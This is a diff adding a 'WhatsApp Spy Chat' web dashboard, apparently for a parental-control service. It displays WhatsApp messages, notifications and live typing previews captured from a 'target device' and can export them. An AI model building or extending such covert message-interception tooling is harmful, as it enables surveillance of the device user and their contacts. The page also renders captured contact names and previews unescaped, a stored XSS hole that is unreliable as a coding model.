@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhatsApp Spy Chat</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { margin: 0; font-family: 'Segoe UI', sans-serif; background-color: #111b21; color: #e9edef; display: flex; height: 100vh; overflow: hidden; }
+
+        .sidebar { width: 30%; max-width: 350px; background: #202c33; border-right: 1px solid #374045; display: flex; flex-direction: column; }
+        .sidebar-header { padding: 15px; background: #202c33; border-bottom: 1px solid #374045; display: flex; justify-content: space-between; align-items: center; }
+        .sidebar-header-left { display: flex; align-items: center; gap: 10px; }
+        .sidebar-header-right { display: flex; align-items: center; gap: 12px; }
+        .header-actions { display: flex; align-items: center; gap: 10px; }
+
+        .search-bar { padding: 8px 15px; background: #202c33; border-bottom: 1px solid #374045; }
+        .search-bar input { width: 100%; padding: 8px 12px; border-radius: 20px; border: none; background: #2a3942; color: #e9edef; font-size: 14px; outline: none; box-sizing: border-box; }
+        .search-bar input::placeholder { color: #8696a0; }
+
+        .contact-list { flex: 1; overflow-y: auto; }
+
+        .contact { padding: 12px 15px; border-bottom: 1px solid #2a3942; cursor: pointer; display: flex; align-items: center; transition: background 0.2s; position: relative; }
+        .contact:hover, .contact.active { background: #2a3942; }
+
+        .avatar { width: 45px; height: 45px; background: #00a884; color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 18px; font-weight: bold; flex-shrink: 0; }
+        .contact-info { flex: 1; overflow: hidden; }
+        .contact-name { font-size: 16px; font-weight: 500; color: #e9edef; margin-bottom: 4px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .last-msg { font-size: 13px; color: #8696a0; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+        .unread-badge { background: #00a884; color: white; border-radius: 50%; min-width: 20px; height: 20px; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: bold; position: absolute; right: 15px; bottom: 15px; }
+
+        .chat-area { flex: 1; background-color: #0b141a; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); display: flex; flex-direction: column; position: relative; }
+
+        .chat-header { padding: 10px 15px; background: #202c33; display: flex; align-items: center; border-bottom: 1px solid #374045; height: 60px; justify-content: space-between; }
+        .chat-header-left { display: flex; align-items: center; }
+        .chat-header-right { display: flex; align-items: center; gap: 15px; }
+        .back-btn { display: none; margin-right: 15px; color: #e9edef; font-size: 20px; cursor: pointer; }
+        .chat-title { font-size: 16px; font-weight: 600; }
+
+        .messages {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .msg {
+            max-width: 65%;
+            padding: 6px 10px;
+            border-radius: 8px;
+            font-size: 14.2px;
+            position: relative;
+            word-wrap: break-word;
+            line-height: 1.4;
+            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
+            display: inline-block;
+        }
+
+        .msg.outgoing {
+            background: #005c4b;
+            align-self: flex-end;
+            border-top-right-radius: 0;
+            color: white;
+            margin-left: auto;
+        }
+
+        .msg.incoming {
+            background: #202c33;
+            align-self: flex-start;
+            border-top-left-radius: 0;
+            color: #e9edef;
+            margin-right: auto;
+        }
+
+        .msg-sender { font-size: 12px; color: #00a884; font-weight: 600; margin-bottom: 2px; }
+
+        .msg-meta { display: flex; justify-content: flex-end; align-items: center; gap: 4px; margin-top: 2px; }
+        .time { font-size: 11px; color: rgba(255,255,255,0.6); }
+
+        .toggle-switch { position: relative; width: 40px; height: 22px; cursor: pointer; }
+        .toggle-switch input { display: none; }
+        .toggle-slider { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: #8696a0; border-radius: 22px; transition: 0.3s; }
+        .toggle-slider:before { content: ''; position: absolute; height: 16px; width: 16px; left: 3px; bottom: 3px; background: white; border-radius: 50%; transition: 0.3s; }
+        .toggle-switch input:checked + .toggle-slider { background: #00a884; }
+        .toggle-switch input:checked + .toggle-slider:before { transform: translateX(18px); }
+
+        .live-label { font-size: 11px; color: #00a884; font-weight: 600; }
+
+        .empty-state { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100%; color: #8696a0; text-align: center; padding: 30px; }
+        .empty-state i { font-size: 48px; margin-bottom: 15px; color: #374045; }
+        .empty-state .hint { font-size: 13px; margin-top: 8px; color: #667781; }
+
+        .icon-btn { background: none; border: none; color: #8696a0; cursor: pointer; font-size: 16px; padding: 4px; transition: color 0.2s; }
+        .icon-btn:hover { color: #e9edef; }
+
+        @media(max-width: 768px) {
+            .sidebar { width: 100%; position: absolute; z-index: 10; height: 100%; }
+            .chat-area { width: 100%; position: absolute; z-index: 5; height: 100%; }
+            .sidebar.hidden { display: none; }
+            .back-btn { display: block; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar" id="sidebar">
+        <div class="sidebar-header">
+            <div class="sidebar-header-left">
+                <span style="font-size:16px; font-weight:600;">Chats</span>
+                <span class="live-label" id="liveLabel">LIVE</span>
+            </div>
+            <div class="sidebar-header-right">
+                <label class="toggle-switch" title="Live updates">
+                    <input type="checkbox" id="liveToggle" checked onchange="toggleLive()">
+                    <span class="toggle-slider"></span>
+                </label>
+                <i class="fas fa-trash-alt" onclick="resetData()" style="cursor:pointer; font-size:14px; color:#f15c6d;" title="Clear & Reset"></i>
+            </div>
+        </div>
+        <div class="search-bar">
+            <input type="text" id="searchInput" placeholder="Search messages..." oninput="handleSearch()">
+        </div>
+        <div class="contact-list" id="contactList">
+            <div style="padding:20px; text-align:center; color:#8696a0;">Connecting...</div>
+        </div>
+    </div>
+
+    <div class="chat-area">
+        <div class="chat-header" id="chatHeader" style="display:none;">
+            <div class="chat-header-left">
+                <i class="fas fa-arrow-left back-btn" onclick="showSidebar()"></i>
+                <div class="avatar" id="headerAvatar" style="width:35px; height:35px; font-size:14px; margin-right:10px;"></div>
+                <span class="chat-title" id="chatTitle">User</span>
+            </div>
+            <div class="chat-header-right">
+                <button class="icon-btn" onclick="exportChat()" title="Export chat as JSON"><i class="fas fa-download"></i></button>
+            </div>
+        </div>
+
+        <div class="messages" id="msgBox">
+            <div class="empty-state">
+                <i class="fas fa-comments"></i>
+                <div>Select a chat</div>
+            </div>
+        </div>
+    </div>
+
+    <script src="socket.io.min.js"></script>
+    <!-- Local socket.io.min.js – fixes CDN timeout -->
+    <script>
+        // --- AUTH CHECK ---
+        (function(){
+            var t = localStorage.getItem("access_token");
+            if(!t){ window.location.href='/login'; return; }
+            try {
+                var u = JSON.parse(localStorage.getItem("user") || "{}");
+                if(!u.email){ window.location.href='/login'; }
+            } catch(e){ window.location.href='/login'; }
+        })();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = (urlParams.get('id') || localStorage.getItem('monitoring_id') || '').toString().trim();
+
+        const SERVER_URL = 'https://parents-control-website1.onrender.com';
+        const STORAGE_KEY = `whatsapp_spy_v7_${deviceId}`;
+
+        const API_CONTACTS = `${SERVER_URL}/api/chat_contacts?childId=${encodeURIComponent(deviceId)}&app=whatsapp`;
+        const API_CHATS = (contact) => `${SERVER_URL}/api/chats?childId=${encodeURIComponent(deviceId)}&app=whatsapp&contact=${encodeURIComponent(contact)}`;
+        const API_ALL_CHATS = `${SERVER_URL}/api/chats?childId=${encodeURIComponent(deviceId)}&app=whatsapp&limit=5000`;
+        const API_WHATSAPP = `${SERVER_URL}/api/get-data/${deviceId}/whatsapp_chat`;
+        const API_NOTIFS = `${SERVER_URL}/api/get-data/${deviceId}/notifications`;
+
+        let allChats = {};
+        let currentChatUser = null;
+        let isLive = true;
+        let socket = null;
+        let unreadCounts = {};
+        let searchQuery = '';
+        let useNewApi = true;
+        let syncInFlight = false;
+        let liveTypingPreview = null;
+        let socketReconnectTimer = null;
+
+        function loadStorage() {
+            // DB only — clear any old browser cache
+            try { localStorage.removeItem(STORAGE_KEY); } catch (e) {}
+            allChats = {};
+        }
+
+        function saveStorage() {
+            // Do not persist to localStorage — source of truth is server/DB
+        }
+
+        function resetData() {
+            if(confirm("Clear screen & reload from database?")) {
+                try { localStorage.removeItem(STORAGE_KEY); } catch (e) {}
+                allChats = {};
+                location.reload();
+            }
+        }
+
+        function toggleLive() {
+            isLive = document.getElementById('liveToggle').checked;
+            const label = document.getElementById('liveLabel');
+            label.textContent = isLive ? 'LIVE' : 'PAUSED';
+            label.style.color = isLive ? '#00a884' : '#8696a0';
+            if (isLive) {
+                syncData();
+                connectSocket();
+            } else {
+                disconnectSocket();
+            }
+        }
+
+        function detectMediaLabel(text) {
+            if (!text) return text;
+            const t = text.toLowerCase();
+            if (t.includes('image') || t.includes('photo') || t.includes('.jpg') || t.includes('.png') || t.includes('.jpeg')) return '[📷 Photo]';
+            if (t.includes('voice') || t.includes('audio') || t.includes('.ogg') || t.includes('.opus')) return '[🎤 Voice]';
+            if (t.includes('location') || t.includes('maps') || t.includes('geo')) return '[📍 Location]';
+            if (t.includes('sticker')) return '[🖼 Sticker]';
+            if (t.includes('video') || t.includes('.mp4')) return '[🎥 Video]';
+            if (t.includes('document') || t.includes('.pdf') || t.includes('.doc')) return '[📄 Document]';
+            if (t.includes('contact')) return '[👤 Contact]';
+            return null;
+        }
+
+        function extractSender(text) {
+            if (!text) return null;
+            const match = text.match(/^([^:]{1,30}):\s*/);
+            if (match) return match[1].trim();
+            return null;
+        }
+
+        async function syncData() {
+            if (!deviceId || syncInFlight) return;
+            syncInFlight = true;
+            try {
+                if (useNewApi) {
+                    const success = await syncNewApi();
+                    if (!success) {
+                        useNewApi = false;
+                        await syncFallback();
+                    }
+                } else {
+                    await syncFallback();
+                }
+            } catch(e) {
+                console.log(e);
+            } finally {
+                syncInFlight = false;
+            }
+        }
+
+        async function syncNewApi() {
+            try {
+                // One request replaces the previous N-per-contact loop, which was the
+                // main reason the page appeared stuck on "Connecting" for large histories.
+                const res = await fetch(API_ALL_CHATS, { cache: 'no-store' });
+                if (!res.ok) return false;
+                const messages = await res.json();
+                if (!Array.isArray(messages)) return false;
+
+                let hasNewData = false;
+                messages.forEach(m => {
+                    const contactName = m.conversation || m.contactName || m.chat_with || m.title || m.sender || 'Unknown';
+                    const msgText = m.message || m.text || m.body;
+                    const msgTime = m.time || m.timestamp || m.createdAt;
+                    const msgDir = (m.direction || m.type || '').toString().toLowerCase();
+                    const sender = m.sender || m.from || null;
+                    let direction = 'incoming';
+                    if (msgDir.includes('out') || msgDir.includes('sent') || msgDir === 'me') direction = 'outgoing';
+                    if (msgText && processMessage(contactName, msgText, msgTime, direction, sender, m.eventId || m.id)) {
+                        hasNewData = true;
+                    }
+                });
+
+                if (hasNewData) {
+                    saveStorage();
+                    renderContacts();
+                    if (currentChatUser) renderMessages(currentChatUser);
+                }
+                return true;
+            } catch(e) {
+                console.log('New API failed, falling back:', e);
+                return false;
+            }
+        }
+
+        async function syncFallback() {
+            try {
+                const [chats, notifs] = await Promise.all([
+                    fetch(API_WHATSAPP).then(r => r.json()).catch(()=>[]),
+                    fetch(API_NOTIFS).then(r => r.json()).catch(()=>[])
+                ]);
+
+                let hasNewData = false;
+
+                chats.forEach(item => {
+                    let d = item;
+                    if (item.data && typeof item.data === 'string') {
+                        try { d = JSON.parse(item.data); } catch(e) {}
+                    }
+                    const msgText = d.message || d.text;
+                    const chatUser = d.chat_with || d.title;
+                    const msgTime = d.time || d.timestamp;
+                    let rawDir = (d.direction || d.type || '').toString().toLowerCase();
+                    let msgDir = 'incoming';
+                    if (rawDir.includes('out') || rawDir.includes('sent') || rawDir === 'me') {
+                        msgDir = 'outgoing';
+                    }
+                    if (msgText && chatUser) {
+                        if (processMessage(chatUser, msgText, msgTime, msgDir)) hasNewData = true;
+                    }
+                });
+
+                notifs.forEach(item => {
+                    if(item.packageName && item.packageName.includes('whatsapp')) {
+                        if(processMessage(item.title, item.text, item.postTime, 'incoming')) hasNewData = true;
+                    }
+                });
+
+                if (hasNewData) {
+                    saveStorage();
+                    renderContacts();
+                    if(currentChatUser) renderMessages(currentChatUser);
+                }
+            } catch(e) { console.log(e); }
+        }
+
+        function processMessage(user, text, time, type, sender, eventId) {
+            if (!user || !text || text.trim() === "") return false;
+            if (user.includes("WhatsApp") && user.length < 12) return false;
+            if (/new messages/i.test(text)) return false;
+            if (/incoming voice call|incoming video call/i.test(text)) return false;
+
+            let ts = 0;
+            if (typeof time === 'number') ts = time;
+            else if (time != null) {
+                ts = new Date(time).getTime();
+                if (isNaN(ts)) ts = parseInt(time, 10);
+            }
+            if (!ts || isNaN(ts)) ts = Date.now();
+
+            if (!allChats[user]) allChats[user] = [];
+            const history = allChats[user];
+            const alreadyExists = history.some(m =>
+                (eventId && m.eventId === eventId) ||
+                (m.text === text && m.type === type && Math.abs(m.time - ts) < 5000 && (m.sender || '') === (sender || ''))
+            );
+            if (alreadyExists) return false;
+
+            const entry = { text, time: ts, type };
+            if (sender) entry.sender = sender;
+            if (eventId) entry.eventId = eventId;
+
+            history.push(entry);
+            history.sort((a,b) => a.time - b.time);
+
+            if (currentChatUser !== user) {
+                unreadCounts[user] = (unreadCounts[user] || 0) + 1;
+            }
+
+            return true;
+        }
+
+        function renderContacts() {
+            const list = document.getElementById('contactList');
+            let users = Object.keys(allChats).sort((a,b) => {
+                const lastA = allChats[a][allChats[a].length-1]?.time || 0;
+                const lastB = allChats[b][allChats[b].length-1]?.time || 0;
+                return lastB - lastA;
+            });
+
+            if (searchQuery) {
+                const q = searchQuery.toLowerCase();
+                users = users.filter(u => {
+                    if (u.toLowerCase().includes(q)) return true;
+                    return allChats[u].some(m => (m.text || '').toLowerCase().includes(q));
+                });
+            }
+
+            if(users.length === 0) {
+                list.innerHTML = `
+                    <div class="empty-state" style="height:auto; padding:40px 20px;">
+                        <i class="fas fa-comment-slash"></i>
+                        <div>Koi chats abhi tak capture nahi hui</div>
+                        <div class="hint">Make sure the monitoring app is running on the target device</div>
+                    </div>`;
+                return;
+            }
+
+            list.innerHTML = "";
+            users.forEach(user => {
+                const msgs = allChats[user];
+                const last = msgs[msgs.length - 1];
+                const active = currentChatUser === user ? 'active' : '';
+                const d = new Date(last.time);
+                const timeStr = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});
+
+                let preview = last.text;
+                const mediaLabel = detectMediaLabel(preview);
+                if (mediaLabel) preview = mediaLabel;
+                if (preview.length > 40) preview = preview.substring(0, 40) + '...';
+                if(last.type === 'outgoing') preview = `<i class="fas fa-check" style="color:#00a884;"></i> ${preview}`;
+
+                const unread = unreadCounts[user] || 0;
+                const badge = unread > 0 ? `<div class="unread-badge">${unread > 99 ? '99+' : unread}</div>` : '';
+
+                list.innerHTML += `
+                    <div class="contact ${active}" onclick="openChat('${user.replace(/'/g, "\\'")}')">
+                        <div class="avatar">${user[0].toUpperCase()}</div>
+                        <div class="contact-info">
+                            <div class="contact-name" style="display:flex; justify-content:space-between;">
+                                ${user} <span style="font-size:11px; color:#8696a0; font-weight:normal;">${timeStr}</span>
+                            </div>
+                            <div class="last-msg">${preview}</div>
+                        </div>
+                        ${badge}
+                    </div>
+                `;
+            });
+        }
+
+        function openChat(user) {
+            currentChatUser = user;
+            unreadCounts[user] = 0;
+            document.getElementById('chatTitle').innerText = user;
+            document.getElementById('headerAvatar').innerText = user[0].toUpperCase();
+            document.getElementById('chatHeader').style.display = 'flex';
+            if(window.innerWidth < 768) document.getElementById('sidebar').classList.add('hidden');
+            renderMessages(user);
+            renderContacts();
+        }
+
+        function escapeHtml(value) {
+            return String(value == null ? '' : value)
+                .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;').replace(/'/g, '&#039;');
+        }
+
+        function renderMessages(user) {
+            const box = document.getElementById('msgBox');
+            box.innerHTML = "";
+            const msgs = allChats[user] || [];
+
+            if (msgs.length === 0) {
+                box.innerHTML = `
+                    <div class="empty-state">
+                        <i class="fas fa-comment-slash"></i>
+                        <div>Koi chats abhi tak capture nahi hui</div>
+                        <div class="hint">Messages will appear here once captured</div>
+                    </div>`;
+                renderWhatsAppLiveTyping(user);
+                box.scrollTop = box.scrollHeight;
+                return;
+            }
+
+            let lastDate = "";
+
+            msgs.forEach(m => {
+                const d = new Date(m.time);
+                const dStr = d.toLocaleDateString();
+                if (dStr !== lastDate) {
+                    box.innerHTML += `<div style="align-self:center; background:#1f2c34; padding:5px 12px; border-radius:8px; font-size:12px; color:#8696a0; margin:10px 0;">${dStr}</div>`;
+                    lastDate = dStr;
+                }
+
+                const tStr = d.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit', hour12:false});
+
+                const div = document.createElement('div');
+                div.className = `msg ${m.type}`;
+
+                let displayText = m.text;
+                const mediaLabel = detectMediaLabel(m.text);
+                if (mediaLabel) displayText = mediaLabel;
+
+                let senderHtml = '';
+                if (m.sender) {
+                    senderHtml = `<div class="msg-sender">${escapeHtml(m.sender)}</div>`;
+                } else if (m.type === 'incoming') {
+                    const detected = extractSender(m.text);
+                    if (detected) {
+                        senderHtml = `<div class="msg-sender">${escapeHtml(detected)}</div>`;
+                        displayText = m.text.replace(/^[^:]{1,30}:\s*/, '');
+                        if (mediaLabel) displayText = mediaLabel;
+                    }
+                }
+
+                const safeDisplayText = escapeHtml(displayText).replace(/\r?\n/g, '<br>');
+                div.innerHTML = `
+                    ${senderHtml}
+                    ${safeDisplayText}
+                    <div class="msg-meta">
+                        <span class="time">${tStr}</span>
+                        ${m.type === 'outgoing' ? '<i class="fas fa-check-double" style="color:#53bdeb; font-size:10px;"></i>' : ''}
+                    </div>
+                `;
+                box.appendChild(div);
+            });
+            renderWhatsAppLiveTyping(user);
+            box.scrollTop = box.scrollHeight;
+        }
+
+        function renderWhatsAppLiveTyping(user) {
+            if (!liveTypingPreview || liveTypingPreview.contact !== user) return;
+            const box = document.getElementById('msgBox');
+            const div = document.createElement('div');
+            div.id = 'whatsapp-live-typing-preview';
+            div.className = 'msg outgoing';
+            div.style.opacity = '0.78';
+            div.innerHTML = `${escapeHtml(liveTypingPreview.text)}<div class="msg-meta"><span class="time">typing</span></div>`;
+            box.appendChild(div);
+        }
+
+        function handleWhatsAppLiveTyping(data) {
+            if (!data || (data.device_id && String(data.device_id).toUpperCase() !== String(deviceId).toUpperCase())) return;
+            const app = String(data.application || data.app || '').toLowerCase();
+            const pkg = String(data.packageName || data.package || '').toLowerCase();
+            if ((app && !app.includes('whatsapp')) && (pkg && !pkg.includes('whatsapp'))) return;
+            const action = String(data.action || '').toLowerCase();
+            const contact = String(data.actorName || data.contact || data.contactName || data.chat_with || '').trim();
+            if (action === 'sent' || data.final === true || !contact) {
+                liveTypingPreview = null;
+                if (currentChatUser) renderMessages(currentChatUser);
+                return;
+            }
+            if (action !== 'typing') return;
+            const message = String(data.message || '').trim();
+            if (!message) {
+                liveTypingPreview = null;
+                if (currentChatUser === contact) renderMessages(contact);
+                return;
+            }
+            liveTypingPreview = { contact, text: message, timestamp: Number(data.timestamp || Date.now()) };
+            if (currentChatUser === contact) renderMessages(contact);
+            else if (allChats[contact] && allChats[contact].length) {
+                renderContacts();
+            }
+        }
+
+        function handleSearch() {
+            searchQuery = document.getElementById('searchInput').value.trim();
+            renderContacts();
+        }
+
+        function exportChat() {
+            if (!currentChatUser || !allChats[currentChatUser]) return;
+            const data = {
+                contact: currentChatUser,
+                exportedAt: new Date().toISOString(),
+                deviceId: deviceId,
+                messages: allChats[currentChatUser].map(m => ({
+                    text: m.text,
+                    time: new Date(m.time).toISOString(),
+                    direction: m.type,
+                    sender: m.sender || null
+                }))
+            };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `whatsapp_${currentChatUser.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.json`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+
+        function showSidebar() {
+            document.getElementById('sidebar').classList.remove('hidden');
+            currentChatUser = null;
+        }
+
+        function connectSocket() {
+            if (socket) return;
+            try {
+                socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });
+                socket.on('connect', () => {
+                    socket.emit('join', deviceId);
+                    console.log('Socket connected');
+                });
+                socket.on('chat_update', (data) => {
+                    if (!data || (data.device_id && String(data.device_id).toUpperCase() !== String(deviceId).toUpperCase())) return;
+                    if (data.app && String(data.app).toLowerCase() !== 'whatsapp') return;
+                    if (String(data.direction || '').toLowerCase().includes('out')
+                            || data.final === true || String(data.action || '').toLowerCase() === 'sent') {
+                        liveTypingPreview = null;
+                    }
+                    const user = data.chat_with || data.contact || data.contactName || data.title;
+                    const text = data.message || data.text || data.body;
+                    const time = data.time || data.timestamp || data.createdAt;
+                    const dir = (data.direction || data.type || '').toString().toLowerCase();
+                    const sender = data.sender || data.from || null;
+                    let direction = 'incoming';
+                    if (dir.includes('out') || dir.includes('sent') || dir === 'me') direction = 'outgoing';
+                    if (user && text) {
+                        if (text && processMessage(user, text, time, direction, sender, data.eventId || data.id)) {
+                            saveStorage();
+                            renderContacts();
+                            if (currentChatUser === user) renderMessages(user);
+                        }
+                    } else if (data.app === 'whatsapp') {
+                        syncData();
+                    }
+                });
+                socket.on('live_status_update', (data) => {
+                    handleWhatsAppLiveTyping(data);
+                });
+                socket.on('connect_error', (error) => {
+                    console.log('Socket connect error:', error && error.message);
+                    if (socket) { try { socket.disconnect(); } catch (e) {} }
+                    socket = null;
+                    scheduleSocketReconnect();
+                });
+                socket.on('disconnect', () => {
+                    console.log('Socket disconnected');
+                    socket = null;
+                    scheduleSocketReconnect();
+                });
+            } catch(e) { console.log('Socket error:', e); }
+        }
+
+        function scheduleSocketReconnect() {
+            if (!isLive || socketReconnectTimer) return;
+            socketReconnectTimer = setTimeout(() => {
+                socketReconnectTimer = null;
+                if (isLive) connectSocket();
+            }, 3000);
+        }
+
+        function disconnectSocket() {
+            if (socketReconnectTimer) {
+                clearTimeout(socketReconnectTimer);
+                socketReconnectTimer = null;
+            }
+            if (socket) {
+                socket.disconnect();
+                socket = null;
+            }
+        }
+
+        loadStorage();
+        syncData();
+        setInterval(syncData, 15000);
+        if (isLive) connectSocket();
+    </script>
+</body>
+</html>
